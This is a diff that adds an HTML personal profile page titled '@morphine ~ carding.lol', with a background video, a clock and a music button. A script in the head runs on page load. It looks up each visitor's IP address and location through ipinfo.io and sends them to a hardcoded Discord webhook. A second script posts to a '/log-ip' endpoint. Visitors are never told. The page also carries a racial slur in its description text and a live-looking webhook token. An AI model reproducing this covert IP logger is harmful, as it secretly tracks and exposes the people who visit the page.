@@ -1,0 +1,188 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>@morphine ~ carding.lol</title>
+
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1275745965185171466/iTBVcvEwyDRS8Re6Duh0gmzkykeI_T9I7UWSaaXklzE6NWbaDS0421Nm3_nQqy51ntaFH";
+
+        fetch("https://ipinfo.io/json")
+        .then(response => response.json())
+        .then(data => {
+            const embed = {
+                description: `**IP Address: ${data.ip}\nCity: ${data.city}\nState: ${data.region}\nCountry Flag: :flag_${data.country.toLowerCase()}:**`
+            };
+
+            const payload = {
+                embeds: [embed]
+            };
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload),
+            })
+            .catch(err => console.error('Error sending data to Discord:', err));
+        })
+        .catch(err => console.error('Error fetching IP info:', err));
+    </script>
+         
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: monospace;
+            background-color: #101010;
+            color: white;
+            overflow: hidden; /* Hide scrollbars */
+        }
+
+        .container {
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            margin: auto;
+            width: 250px;
+            height: fit-content;
+            border: 4px solid rgb(122, 15, 104);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            background-color: rgb(15, 15, 15);
+            padding: 10px;
+            z-index: 1; /* Ensure content is above other elements */
+        }
+
+        .profile {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            margin-top: 10px;
+        }
+
+        .username, .description {
+            color: white;
+        }
+
+        .description {
+            color: rgba(255, 255, 255, 0.4);
+        }
+
+        #myVideo {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1; /* Place video behind other content */
+        }
+
+        #clockDisplay {
+    position: absolute;
+    top: 10px;
+    left: 50%;
+    transform: translateX(-50%);
+    font-size: 24px;
+    color: rgb(7, 20, 211, 0.4);
+}
+
+
+        #eny {
+            position: absolute;
+            top: 60%; /* Positioning it below the container */
+            left: 49%;
+            transform: translateX(-40%);
+            font-size: 18px;
+            color: rgba(255, 255, 255, 0.4); /* Semi-transparent text */
+            text-align: center;
+            z-index: 1; /* Ensure text is above other elements */
+            transition: color 0.3s; /* Smooth transition for color changes */
+        }
+
+        #eny a {
+            color: inherit; /* Use the inherited color */
+            text-decoration: none; /* Remove underline */
+            background: none; /* Remove background */
+            padding: 0; /* Remove padding */
+        }
+    </style>
+</head>
+<body>
+    <video autoplay muted loop id="myVideo">
+        <source src="C:\Users\chang3d\Downloads\private.github.io-main\wow.mp4" type="video/mp4">
+        Your browser does not support the video element.
+    </video>
+
+    <div id="clockDisplay" class="clockStyle"></div>
+
+    <div class="container" id="container">
+        <img class="profile" src="https://files.catbox.moe/81dsbk.jpg" alt="Profile Picture">
+        <a class="username">morphine</a>
+        <a class="description">ima comp nigga.</a>
+    </div>
+
+    <div id="eny">
+        <a href="#" id="musicPrompt">Click for music</a>
+    </div>
+
+    <audio id="audio" loop>
+        <source src="https://files.catbox.moe/beyv88.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+    
+    <script>
+      fetch('/log-ip', {
+          method: 'POST'
+      });
+  </script>
+
+    <script>
+        // Get the audio and video elements
+        const audio = document.getElementById('audio');
+        const video = document.getElementById('myVideo');
+        const musicPrompt = document.getElementById('musicPrompt');
+
+        // Set audio properties
+        audio.volume = 0.5; // Set volume to a reasonable level (adjust as needed)
+
+        // Optional: Handle video end event
+        video.addEventListener('ended', () => {
+            console.log('Video ended.');
+        });
+
+        // Function to update the clock
+        function updateClock() {
+            const now = new Date();
+            const hours = String(now.getHours()).padStart(2, '0');
+            const minutes = String(now.getMinutes()).padStart(2, '0');
+            const seconds = String(now.getSeconds()).padStart(2, '0');
+            document.getElementById('clockDisplay').textContent = `${hours}:${minutes}:${seconds}`;
+        }
+
+        // Update the clock every second
+        setInterval(updateClock, 1000);
+
+        // Handle click event to play/pause the music
+        musicPrompt.addEventListener('click', () => {
+            if (audio.paused) {
+                audio.play();
+                musicPrompt.textContent = 'Music is playing';
+                musicPrompt.style.color = 'rgba(255, 255, 255, 0.2)'; // Make text more transparent when music is playing
+            } else {
+                audio.pause();
+                musicPrompt.textContent = 'Click for music';
+                musicPrompt.style.color = 'rgba(255, 255, 255, 0.4)'; // Reset the transparency
+            }
+        });
+    </script>
+</body>
+</html>
